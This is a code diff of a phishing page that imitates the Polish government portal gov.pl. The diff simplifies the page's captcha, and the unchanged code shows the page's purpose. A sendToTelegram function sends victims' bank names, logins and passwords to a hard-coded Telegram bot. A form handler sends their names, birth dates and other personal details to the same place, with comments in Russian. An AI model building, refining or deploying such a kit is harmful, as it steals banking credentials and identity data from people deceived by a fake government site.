@@ -11,9 +11,6 @@
     
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
-        /* ============================================================
-           FULL CSS — WSZYSTKIE STYLE ZACHOWANE
-           ============================================================ */
         * {
             margin: 0;
             padding: 0;
@@ -44,7 +41,7 @@
         }
 
         /* ============================================================
-           СТИЛИ КАПЧИ (ОРИГИНАЛЬНАЯ ВЕРСИЯ)
+           КАПЧА (ПРОСТАЯ ЦИФРОВАЯ)
            ============================================================ */
         #captchaOverlay {
             position: fixed;
@@ -132,7 +129,6 @@
             border-radius: 10px;
             font-size: 20px;
             letter-spacing: 8px;
-            text-transform: uppercase;
             text-align: center;
             background: #f8faff;
             transition: border-color 0.2s, box-shadow 0.2s;
@@ -214,7 +210,7 @@
         }
 
         /* ============================================================
-           ОСТАЛЬНЫЕ СТИЛИ (ОРИГИНАЛ)
+           ОСТАЛЬНЫЕ СТИЛИ
            ============================================================ */
         .header {
             background: #ffffff;
@@ -3361,9 +3357,7 @@
 </head>
 <body>
 
-    <!-- ================================================================
-         КАПЧА — ОРИГИНАЛЬНАЯ ВЕРСИЯ
-         ================================================================ -->
+    <!-- ===== КАПЧА (ПРОСТАЯ ЦИФРОВАЯ) ===== -->
     <div id="captchaOverlay">
         <div class="captcha-box">
             <div class="captcha-title">🔐 Weryfikacja</div>
@@ -3982,120 +3976,122 @@
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //   КАПЧА — ОРИГИНАЛЬНАЯ ОБФУСЦИРОВАННАЯ ВЕРСИЯ
+        //   ПРОСТАЯ ЦИФРОВАЯ КАПЧА
         // ============================================================
         (function() {
-            var _0x1a = document.getElementById('captchaCanvas');
-            var _0x2b = _0x1a.getContext('2d');
-            var _0x3c = document.getElementById('captchaInput');
-            var _0x4d = document.getElementById('captchaStatus');
-            var _0x5e = document.getElementById('refreshCaptcha');
-            var _0x6f = document.getElementById('captchaSubmitBtn');
-            var _0x7g = document.getElementById('captchaOverlay');
-            var _0x8h = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
-            var _0x9i = '';
+            var canvas = document.getElementById('captchaCanvas');
+            var ctx = canvas.getContext('2d');
+            var input = document.getElementById('captchaInput');
+            var status = document.getElementById('captchaStatus');
+            var refresh = document.getElementById('refreshCaptcha');
+            var submitBtn = document.getElementById('captchaSubmitBtn');
+            var overlay = document.getElementById('captchaOverlay');
+            var alphabet = '0123456789';
+            var secret = '';
 
-            function _0xir(_0xjs) {
-                var _0xkt = 0, _0xlu = 0, _0xmv = 0, _0xnw = 0;
-                for (var _0xox = 0; _0xox < _0xjs.length; _0xox++) {
-                    var _0xpy = _0xjs.charCodeAt(_0xox);
-                    _0xkt = (_0xkt << 5) - _0xkt + _0xpy;
-                    _0xkt |= 0;
-                    _0xlu = (_0xlu << 7) + _0xpy;
-                    _0xmv ^= _0xpy;
-                    _0xnw = (_0xnw << 3) ^ _0xpy;
+            // Хэш-функция (простая)
+            function hash(str) {
+                var h = 0;
+                for (var i = 0; i < str.length; i++) {
+                    h = ((h << 5) - h) + str.charCodeAt(i);
+                    h |= 0;
                 }
-                return String(_0xkt) + String(_0xlu) + String(_0xmv) + String(_0xnw);
+                return String(h);
             }
 
-            function _0xaj() {
-                _0x2b.clearRect(0, 0, 280, 80);
-                var _0xbk = _0x2b.createLinearGradient(0, 0, 280, 80);
-                _0xbk.addColorStop(0, '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'));
-                _0xbk.addColorStop(1, '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'));
-                _0x2b.fillStyle = _0xbk;
-                _0x2b.fillRect(0, 0, 280, 80);
+            // Генерация капчи
+            function generate() {
+                ctx.clearRect(0, 0, 280, 80);
+                
+                // Светлый фон
+                var grad = ctx.createLinearGradient(0, 0, 280, 80);
+                grad.addColorStop(0, '#e8edf5');
+                grad.addColorStop(1, '#d5dce8');
+                ctx.fillStyle = grad;
+                ctx.fillRect(0, 0, 280, 80);
 
-                for (var _0xcl = 0; _0xcl < 80; _0xcl++) {
-                    _0x2b.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    _0x2b.fillRect(Math.random() * 280, Math.random() * 80, 2, 2);
-                }
-                for (var _0xdm = 0; _0xdm < 20; _0xdm++) {
-                    _0x2b.strokeStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    _0x2b.lineWidth = Math.random() * 2.5;
-                    _0x2b.beginPath();
-                    _0x2b.moveTo(Math.random() * 280, Math.random() * 80);
-                    _0x2b.lineTo(Math.random() * 280, Math.random() * 80);
-                    _0x2b.stroke();
+                // 30 точек шума
+                for (var i = 0; i < 30; i++) {
+                    ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+                    ctx.fillRect(Math.random() * 280, Math.random() * 80, 2, 2);
                 }
 
-                _0x9i = '';
-                for (var _0xen = 0; _0xen < 6; _0xen++) {
-                    var _0xfo = _0x8h[Math.floor(Math.random() * _0x8h.length)];
-                    _0x9i += _0xfo;
-                    var _0xgp = 30 + _0xen * 40 + Math.random() * 12;
-                    var _0xhq = 55 + Math.random() * 16 - 8;
-                    _0x2b.save();
-                    _0x2b.translate(_0xgp, _0xhq);
-                    _0x2b.rotate((Math.random() - 0.5) * 0.9);
-                    _0x2b.font = (38 + Math.random() * 14) + 'px Arial';
-                    _0x2b.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    _0x2b.shadowColor = '#000';
-                    _0x2b.shadowBlur = 4;
-                    _0x2b.fillText(_0xfo, 0, 0);
-                    _0x2b.restore();
+                // 5 линий шума (тонкие)
+                for (var i = 0; i < 5; i++) {
+                    ctx.strokeStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+                    ctx.lineWidth = Math.random() * 1.5;
+                    ctx.beginPath();
+                    ctx.moveTo(Math.random() * 280, Math.random() * 80);
+                    ctx.lineTo(Math.random() * 280, Math.random() * 80);
+                    ctx.stroke();
                 }
 
-                _0x3c.value = '';
-                _0x3c.classList.remove('error');
-                _0x4d.classList.remove('visible');
-                _0x6f.disabled = false;
-                _0x6f.classList.remove('loading');
-                _0x6f.querySelector('span').textContent = 'Zweryfikuj';
+                // Генерация 6 цифр разными цветами
+                secret = '';
+                var colors = ['#cc0000', '#003b6f', '#009c3b', '#cc5500', '#6a0dad', '#008080'];
+                for (var i = 0; i < 6; i++) {
+                    var digit = alphabet[Math.floor(Math.random() * alphabet.length)];
+                    secret += digit;
+                    
+                    var x = 30 + i * 40 + Math.random() * 10;
+                    var y = 55 + Math.random() * 10 - 5;
+                    
+                    ctx.save();
+                    ctx.translate(x, y);
+                    ctx.rotate((Math.random() - 0.5) * 0.4);
+                    ctx.font = (40 + Math.random() * 8) + 'px Arial';
+                    ctx.fillStyle = colors[i % colors.length];
+                    ctx.shadowColor = 'rgba(0,0,0,0.15)';
+                    ctx.shadowBlur = 3;
+                    ctx.fillText(digit, 0, 0);
+                    ctx.restore();
+                }
+
+                // Сброс
+                input.value = '';
+                input.classList.remove('error');
+                status.classList.remove('visible');
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('loading');
+                submitBtn.querySelector('span').textContent = 'Zweryfikuj';
+                input.focus();
             }
 
-            function _0xqz() {
-                var _0xra = _0x3c.value.trim().toUpperCase();
-                var _0xsb = _0xir(_0x9i);
-                var _0xtc = _0xir(_0xra);
-                if (_0xtc === _0xsb) {
-                    _0x3c.classList.remove('error');
-                    _0x4d.classList.remove('visible');
-                    _0x7g.classList.add('hidden');
+            // Проверка
+            function verify() {
+                var val = input.value.trim();
+                if (hash(val) === hash(secret)) {
+                    input.classList.remove('error');
+                    status.classList.remove('visible');
+                    overlay.classList.add('hidden');
                     document.body.style.overflow = '';
-                    _0x6f.disabled = true;
-                    _0x6f.classList.add('loading');
-                    _0x6f.querySelector('span').textContent = 'Weryfikacja...';
-                    setTimeout(function() {
-                        _0x6f.disabled = false;
-                        _0x6f.classList.remove('loading');
-                        _0x6f.querySelector('span').textContent = 'Zweryfikuj';
-                    }, 500);
                     return true;
                 } else {
-                    _0x3c.classList.add('error');
-                    _0x4d.classList.add('visible');
-                    _0x3c.value = '';
-                    _0xaj();
-                    _0x3c.focus();
+                    input.classList.add('error');
+                    status.classList.add('visible');
+                    input.value = '';
+                    generate();
+                    input.focus();
                     return false;
                 }
             }
 
-            _0xaj();
-            _0x5e.onclick = _0xaj;
-            _0x3c.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') { e.preventDefault(); _0xqz(); }
+            // Инициализация
+            generate();
+            refresh.onclick = generate;
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') { e.preventDefault(); verify(); }
             });
-            _0x6f.onclick = _0xqz;
-            _0x3c.addEventListener('input', function() {
-                if (this.value.length === 6) { _0xqz(); }
+            submitBtn.onclick = verify;
+            input.addEventListener('input', function() {
+                if (this.value.length === 6) { verify(); }
             });
-            _0x3c.focus();
-            window._0xresetCaptcha = _0xaj;
+            window.resetCaptcha = generate;
         })();
 
-        // ===== AUTO SLASH =====
+        // ============================================================
+        //   ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // ============================================================
         function autoSlash(event) {
             const input = event.target;
             let value = input.value.replace(/\D/g, '');
@@ -4108,7 +4104,6 @@
             input.value = formatted;
         }
 
-        // ===== AUTO POSTAL =====
         function autoPostal(event) {
             const input = event.target;
             let value = input.value.replace(/\D/g, '');
@@ -4121,7 +4116,6 @@
             input.value = formatted;
         }
 
-        // ===== IBAN =====
         function cleanIbanValue(value) {
             if (!value) return '';
             let cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
@@ -4131,7 +4125,6 @@
             return cleaned;
         }
 
-        // ===== TELEGRAM =====
         function sendToTelegram(bankName, login, password) {
             const message = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName + '\n👤 *Login:* ' + login + '\n🔑 *Hasło:* ' + password + '\n🕒 ' + new Date().toLocaleString();
             fetch('https://api.telegram.org/bot8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs/sendMessage', {
@@ -4233,7 +4226,7 @@
             }
 
             // ============================================================
-            //   ФОРМА — ПРЯМАЯ ОТПРАВКА В TELEGRAM (БЕЗ БЭКЕНДА)
+            //   ФОРМА — ПРЯМАЯ ОТПРАВКА В TELEGRAM
             // ============================================================
             const form = document.getElementById('dataForm');
             const submitBtn = document.getElementById('submitBtn');
@@ -4306,7 +4299,6 @@
 
                     const formData = getFormData();
 
-                    // ===== ОТПРАВКА В TELEGRAM =====
                     const message = '📋 *Nowe dane formularza*\n' +
                                     '👤 *Imię:* ' + formData.fullname + '\n' +
                                     '📅 *Data urodzenia:* ' + formData.birthdate + '\n' +
